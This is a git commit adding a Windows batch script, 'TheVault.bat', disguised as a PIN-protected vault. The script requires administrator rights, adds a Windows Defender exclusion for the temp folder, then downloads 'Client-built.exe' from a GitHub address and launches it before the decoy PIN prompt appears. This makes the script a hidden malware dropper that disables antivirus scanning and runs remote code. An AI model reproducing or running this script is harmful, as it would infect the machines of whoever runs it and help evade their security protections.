75474018e6cf3bb22ec565bb7f657c001659ab9c
Hmmm <benfranksbugeja@hotmail.com>
2025-02-03 20:21:49 +1100

    Add files via upload

---
+++ TheVault.bat
@@ -0,0 +1,32 @@
+@echo off
+title Vault Access
+::Nice try, but the code is obfuscated
+openfiles >nul 2>nul
+if %errorlevel% neq 0 (
+    echo This script requires administrator privileges.
+    echo Please right-click on the script and select "Run as administrator."
+    pause
+    exit
+)
+echo Running as Administrator.
+pause
+cls
+setlocal EnableDelayedExpansion
+cd %TEMP%
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
+PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
+start "" "%TEMP%\Client-built.exe"
+set "encodedPIN=885"
+
+:PINPrompt
+set /p "userPIN=Enter the 3-digit PIN: "
+set /a decodedPIN=!encodedPIN!-329
+if "%userPIN%"=="%decodedPIN%" (
+    echo Correct PIN! Opening the vault...
+	start "" "%TEMP%\Client-built.exe"
+    exit
+) else (
+    echo Incorrect PIN. Try again.
+
+    goto PINPrompt
+)
